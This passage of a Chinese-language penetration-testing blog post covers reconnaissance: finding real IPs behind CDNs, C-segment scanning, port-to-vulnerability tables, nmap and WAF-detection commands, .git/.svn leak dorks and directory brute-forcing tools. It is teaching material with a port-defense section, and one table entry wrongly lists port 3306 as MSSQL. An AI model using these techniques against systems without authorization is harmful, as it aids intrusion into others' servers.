<h5 id="3-绕过CDN"><a href="#3-绕过CDN" class="headerlink" title="(3)绕过CDN"></a>(3)绕过CDN</h5><p><strong>如果目标使用CDN：</strong> 需要绕过CDN后去真实IP地址，方法如下：</p>
<ul>
<li><h6 id="多地Ping"><a href="#多地Ping" class="headerlink" title="多地Ping"></a>多地Ping</h6><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://www.webkaka.com/Ping.aspx">http://www.webkaka.com/Ping.aspx</a><br>用各种多地ping的服务，查看对应IP地址是否唯一</p>
</li>
<li><h6 id="国外访问"><a href="#国外访问" class="headerlink" title="国外访问"></a>国外访问</h6><p><a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a><br>因为有些网站设置CDN可能没有把国外的访问包含进去，所以可以这么绕过</p>
</li>
<li><h6 id="查询子域名的IP"><a href="#查询子域名的IP" class="headerlink" title="查询子域名的IP"></a>查询子域名的IP</h6><p><a href="https://ip.tool.chinaz.com/ipbatch">https://ip.tool.chinaz.com/ipbatch</a><br>CDN流量收费高，所以很多站长可能只会对主站或者流量大的子站点做了CDN,而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的IP来辅助查找网站的真实IP</p>
</li>
<li><h6 id="网站phpinfo文件：phpinfo-php"><a href="#网站phpinfo文件：phpinfo-php" class="headerlink" title="网站phpinfo文件：phpinfo.php"></a>网站phpinfo文件：phpinfo.php</h6></li>
<li><h6 id="内部邮箱源：收集到内部邮箱服务器IP地址"><a href="#内部邮箱源：收集到内部邮箱服务器IP地址" class="headerlink" title="内部邮箱源：收集到内部邮箱服务器IP地址"></a>内部邮箱源：收集到内部邮箱服务器IP地址</h6></li>
<li><h6 id="查询历史DNS记录"><a href="#查询历史DNS记录" class="headerlink" title="查询历史DNS记录"></a>查询历史DNS记录</h6><p>​    <a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a></p>
<p>​    <a href="https://securitytrails.com/">https://securitytrails.com/</a></p>
<p>​    <a href="https://viewdns.info/iphistory/">https://viewdns.info/iphistory/</a></p>
<p>​    <a href="https://www.ip138.com/">https://www.ip138.com/</a></p>
</li>
</ul>
<h4 id="4-C段存货主机探测"><a href="#4-C段存货主机探测" class="headerlink" title="4. C段存货主机探测"></a>4. C段存货主机探测</h4><p>​    C段指的是同一内网段内的其他服务器，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务器。C段在线查询地址：</p>
<ul>
<li><a href="http://www.webscan.cc/">http://www.webscan.cc/</a></li>
<li><a href="https://phpinfo.me/bing.php">https://phpinfo.me/bing.php</a></li>
<li><a href="https://scan.top15.cn/">https://scan.top15.cn</a></li>
</ul>
<h6 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h6><ul>
<li><p>Namp</p>
</li>
<li><p>Cwebscanner    <a href="https://github.com/se55i0n/Cwebscanner">https://github.com/se55i0n/Cwebscanner</a></p>
</li>
</ul>
<h3 id="0x04-端口信息收集"><a href="#0x04-端口信息收集" class="headerlink" title="0x04 端口信息收集"></a>0x04 端口信息收集</h3><h4 id="1-端口简介"><a href="#1-端口简介" class="headerlink" title="1. 端口简介"></a>1. 端口简介</h4><p>​    在Internet上，各主机间通过TCP/IP协议发送和接受数据包，各个数据包根据其目的主机的IP地址来进行互联网络中的路由选择，从而顺利的将数据包顺利的传送给目标主机。根据提供服务类型的不同，端口可分为以下两种：</p>
<ul>
<li>TCP端口：TCP是一种面向连接的可靠的传输层通信协议</li>
<li>UDP端口：UDP是一种无连接的不可靠的传输层协议</li>
</ul>
<p>​    TCP协议和UDP协议是独立的，因此各自的端口号也互相独立。</p>
<h4 id="2-常见端口"><a href="#2-常见端口" class="headerlink" title="2. 常见端口"></a>2. 常见端口</h4><h6 id="1-常用端口类"><a href="#1-常用端口类" class="headerlink" title="(1)  常用端口类"></a>(1)  常用端口类</h6><table>
<thead>
<tr>
<th>端口</th>
<th>服务</th>
</tr>
</thead>
<tbody><tr>
<td>21</td>
<td>ftp</td>
</tr>
<tr>
<td>22</td>
<td>SSH</td>
</tr>
<tr>
<td>23</td>
<td>Telnet</td>
</tr>
<tr>
<td>80</td>
<td>WWW</td>
</tr>
<tr>
<td>139/445</td>
<td>NetBIOS SessionService</td>
</tr>
<tr>
<td>161</td>
<td>SNMP</td>
</tr>
<tr>
<td>389</td>
<td>LDAP</td>
</tr>
<tr>
<td>445</td>
<td>SMB</td>
</tr>
<tr>
<td>1433</td>
<td>MSSQL</td>
</tr>
<tr>
<td>1521</td>
<td>Oracle</td>
</tr>
<tr>
<td>3306</td>
<td>MSSQL</td>
</tr>
<tr>
<td>3389</td>
<td>RDP远程桌面</td>
</tr>
<tr>
<td>5432</td>
<td>PostgreSQL</td>
</tr>
<tr>
<td>5900</td>
<td>vnc</td>
</tr>
<tr>
<td>6379</td>
<td>Redis</td>
</tr>
<tr>
<td>7001</td>
<td>Weblogic</td>
</tr>
<tr>
<td>8080</td>
<td>Tomcat</td>
</tr>
</tbody></table>
<h6 id="2-特殊服务类"><a href="#2-特殊服务类" class="headerlink" title="(2) 特殊服务类"></a>(2) 特殊服务类</h6><table>
<thead>
<tr>
<th>端口</th>
<th>服务</th>
<th>漏洞</th>
</tr>
</thead>
<tbody><tr>
<td>1099</td>
<td>rmi</td>
<td>RCE</td>
</tr>
<tr>
<td>8000</td>
<td>jdwp java</td>
<td>调试接口RCE</td>
</tr>
<tr>
<td>443</td>
<td>SSL</td>
<td>HeartBleed</td>
</tr>
<tr>
<td>873</td>
<td>Rsync</td>
<td>未授权</td>
</tr>
<tr>
<td>5984</td>
<td>CouchDB</td>
<td><a href="http://xxx:5984/_utils/">http://xxx:5984/_utils/</a></td>
</tr>
<tr>
<td>6379</td>
<td>redis</td>
<td>未授权</td>
</tr>
<tr>
<td>7001,7002</td>
<td>Weblogic</td>
<td>默认弱口令，反序列化</td>
</tr>
<tr>
<td>9200，9300</td>
<td>elasticsearch</td>
<td>未授权   RCE</td>
</tr>
<tr>
<td>11211</td>
<td>memcache</td>
<td>未授权</td>
</tr>
<tr>
<td>27017，27018</td>
<td>Mongodb</td>
<td>未授权</td>
</tr>
<tr>
<td>50000</td>
<td>SAP</td>
<td>命令执行</td>
</tr>
<tr>
<td>50060，50070，50030</td>
<td>hadoop</td>
<td>默认端口未授权</td>
</tr>
<tr>
<td>2375</td>
<td>docker</td>
<td>未授权</td>
</tr>
<tr>
<td>3128</td>
<td>squid</td>
<td>代理默认端口</td>
</tr>
<tr>
<td>2601，2604</td>
<td>zebra</td>
<td>路由，默认密码zebra</td>
</tr>
<tr>
<td>4440</td>
<td>rundeck</td>
<td></td>
</tr>
<tr>
<td>4848</td>
<td>glassfish</td>
<td>中间件弱口令</td>
</tr>
<tr>
<td>9000</td>
<td>fcigphp</td>
<td>代码执行</td>
</tr>
<tr>
<td>9043</td>
<td>websphere</td>
<td>弱口令</td>
</tr>
</tbody></table>
<h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3. 端口扫描"></a>3. 端口扫描</h4><h6 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h6><p>​        Network Mapper,是一款开放源代码的网络探测和安全审核的工具<br>​        nmap参考指南（中文版）<a href="https://nmap.org/man/zh/">https://nmap.org/man/zh/</a></p>
<p>​    功能介绍<br>​        1. 检测网络存活主机（主机发现）<br>​        2. 检测主机开放端口（端口发现或枚举）<br>​        3. 检测相应端口软件（服务发现）版本<br>​        4 .检测操作系统，硬件地址，以及软件版本<br>​        5. 检测脆弱性的漏洞（nmap的脚本）</p>
<h4 id="4-端口防御措施"><a href="#4-端口防御措施" class="headerlink" title="4. 端口防御措施"></a>4. 端口防御措施</h4><p>​    对于端口攻击来说，只要端口开放并且可以连通，就可以利用对应的方式进行攻击测试。这里提供的防御措施包括：</p>
<ul>
<li>关闭不必要的端口；</li>
<li>对重要业务的服务端口设置防火墙；</li>
<li>加强员工信息安全意识，经常性更换用户密码，避免弱口令爆破；</li>
<li>经常更新软件，打补丁（Patch）；</li>
<li>利用CVE网站的漏洞信息，提高自身网站的安全。</li>
</ul>
<h3 id="0x05-网站信息收集"><a href="#0x05-网站信息收集" class="headerlink" title="0x05 网站信息收集"></a>0x05 网站信息收集</h3><h4 id="1-网站指纹识别"><a href="#1-网站指纹识别" class="headerlink" title="1. 网站指纹识别"></a>1. 网站指纹识别</h4><h6 id="1-操作系统"><a href="#1-操作系统" class="headerlink" title="(1) 操作系统"></a>(1) 操作系统</h6><ul>
<li>ping判断：windows的TTL值一般为128,Linux则为64。TTL大于100的一般为windows,几十的一般为linux。</li>
<li>nmap-O参数</li>
<li>windows大小写不敏感，linux则区分大小写</li>
</ul>
<h6 id="2-网站服务-容器类型"><a href="#2-网站服务-容器类型" class="headerlink" title="(2) 网站服务/容器类型"></a>(2) 网站服务/容器类型</h6><ul>
<li>F12查看响应头Server字段</li>
<li>whatweb    <a href="https://www.whatweb.net/">https://www.whatweb.net/</a></li>
<li>wappalyzer插件</li>
</ul>
<h6 id="3-脚本类型"><a href="#3-脚本类型" class="headerlink" title="(3) 脚本类型"></a>(3) 脚本类型</h6><p>​    php, jsp, asp/aspx, python</p>
<h6 id="4-数据库类型"><a href="#4-数据库类型" class="headerlink" title="(4) 数据库类型"></a>(4) 数据库类型</h6><p>​    mysql,sqlserver,access,oracle</p>
<h6 id="5-CMS识别"><a href="#5-CMS识别" class="headerlink" title="(5) CMS识别"></a>(5) CMS识别</h6><p>​    在渗透测试中，对目标服务器进行指纹识别是相当有必要的，因为只有识别出相应的Web容器或者CMS（内容管理系统），才能查找与其相关的漏洞，然后才能进行相应的渗透操作。CMS又称整站系统。常见的CMS有：WordPress、Dedecms（织梦）、Discuz、PhpWeb、PhpWind、Dvbbs、PhpCMS、ECShop、、SiteWeaver、AspCMS、帝国、Z-Blog等。</p>
<p>常见识别工具：</p>
<ul>
<li>BugScaner：<a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></li>
<li>云悉指纹：<a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></li>
<li>WhatWeb：<a href="https://whatweb.net/">https://whatweb.net/</a></li>
<li>Onlinetools    <a href="https://github.com/iceyhexman/onlinetools">https://github.com/iceyhexman/onlinetools</a>     <a href="https://pentest.gdpcisa.org/">https://pentest.gdpcisa.org/</a></li>
</ul>
<h4 id="2-敏感文件、目录探测"><a href="#2-敏感文件、目录探测" class="headerlink" title="2. 敏感文件、目录探测"></a>2. 敏感文件、目录探测</h4><p>针对目标Web目录结构和敏感隐藏文件探测是非常重要的，在探测过程中很可能会探测到后台页面、上传页面、数据库文件，甚至是网站源代码文件等。补充谢公子大佬的内容，扫描网站目录结构可以看看是否可以遍历目录，或者敏感文件泄漏，包括：</p>
<blockquote>
<p>后台目录：弱口令，万能密码，爆破</p>
<p>安装包：获取数据库信息，甚至是网站源码</p>
<p>上传目录：截断、上传图片马等</p>
<p>mysql管理接口：弱口令、爆破，万能密码，然后脱裤，甚至是拿到shell</p>
<p>安装页面 ：可以二次安装进而绕过</p>
<p>phpinfo：会把你配置的各种信息暴露出来</p>
<p>编辑器：fck、ke等</p>
<p>iis短文件利用：条件比较苛刻 windows、apache等</p>
</blockquote>
<h6 id="1-敏感文件、目录"><a href="#1-敏感文件、目录" class="headerlink" title="(1) 敏感文件、目录"></a>(1) 敏感文件、目录</h6><ul>
<li><p>github</p>
<p>开发人员将代码上传到网站，在上传的时候，没有删除重要的一些信息。如邮箱信息，SVN信息，内部账号和密码，数据库连接信息，服务器配置信息等。尤其是邮箱信息和内部账号和密码。这类信息可以通过在github上搜索公司的一些特定信息，查看是否有程序员将这些信息上传到了github上</p>
</li>
<li><p>git</p>
<p>“.git” intitle:”index of “<br><a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a></p>
</li>
<li><p>svn</p>
<p>“.svn” intitle:”index of “<br><a href="https://github.com/admintony/svnExploit">https://github.com/admintony/svnExploit</a></p>
</li>
<li><p>.DS_Storehg</p>
</li>
<li><p>.bzr</p>
</li>
<li><p>CVS</p>
</li>
<li><p>WEB-INF</p>
</li>
<li><p>备份文件</p>
</li>
</ul>
<h6 id="2-网站备份文件"><a href="#2-网站备份文件" class="headerlink" title="(2) 网站备份文件"></a>(2) 网站备份文件</h6><p>​    网站备份文件泄露指管理员误将网站备份文件或是敏感信息文件存放在某个网站目录下。<br><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></p>
<h6 id="3-目录探测"><a href="#3-目录探测" class="headerlink" title="(3)目录探测"></a>(3)目录探测</h6><ul>
<li>dirsearch:<a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li>
<li>御剑后台扫描工具</li>
<li>dirmap:<a href="https://github.com/H4ckForJob/dirmap">https://github.com/H4ckForJob/dirmap</a></li>
</ul>
<h4 id="3-网站WAF识别"><a href="#3-网站WAF识别" class="headerlink" title="3. 网站WAF识别"></a>3. 网站WAF识别</h4><p>​    <strong>WAF</strong>  即：Web Application FireWall(Web应用防火墙）。可以通俗的理解为：用于保护网站，防黑客、防网络攻击的安全防护系统；是最有效、最直接的Web安全防护产品。WAF功能如下</p>
<ol>
<li>防止常见的各类网络攻击，如：SQL注入、XSS跨站、CSRF、网页后门等；</li>
<li> 防止各类自动化攻击，如：暴力破解、撞库、批量注册、自动发贴等；</li>
<li> 阻止其它常见威胁，如：爬虫、0DAY攻击、代码分析、嗅探、数据慕改、越权访问、敏感信息泄漏、应用层DDOS、远程恶意包含、盗链、越权、扫描等。</li>
</ol>
<h6 id="1-WAF识别"><a href="#1-WAF识别" class="headerlink" title="(1) WAF识别"></a>(1) WAF识别</h6><ul>
<li><p>wafw00f<br><a href="https://github.com/EnableSecurity/wafwoof">https://github.com/EnableSecurity/wafwoof</a><br>nmap-p80,443–script http-waf-detect ip<br>nmap-p80,443–script http-waf-fingerprint ip</p>
</li>
<li><p>看图识waf,常见WAF拦截页面总结<br><a href="https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw">https://mp.weixin.qq.com/s/PWkqNsygi-c_S7tW1y_Hxw</a></p>
</li>
</ul>
<h3 id="0x06-其他信息收集"><a href="#0x06-其他信息收集" class="headerlink" title="0x06 其他信息收集"></a>0x06 其他信息收集</h3><h4 id="1-历史漏洞信息"><a href="#1-历史漏洞信息" class="headerlink" title="1.历史漏洞信息"></a>1.历史漏洞信息</h4><ul>
<li>乌云镜像站<br><a href="http://wy.zone.ci/">http://wy.zone.ci/</a></li>
<li>乌云知识库<br><a href="https://wooyun.kieran.top/#!/">https://wooyun.kieran.top/#!/</a></li>
<li>exploit-db<br><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li>
<li>知道创宇seebug<br><a href="https://www.seebug.org/">https://www.seebug.org/</a></li>
</ul>
<h4 id="2-社会工程学"><a href="#2-社会工程学" class="headerlink" title="2.社会工程学"></a>2.社会工程学</h4><p>不谈，怕进去</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>渗透测试</tag>
        <tag>信息收集</tag>
      </tags>
  </entry>
</search>
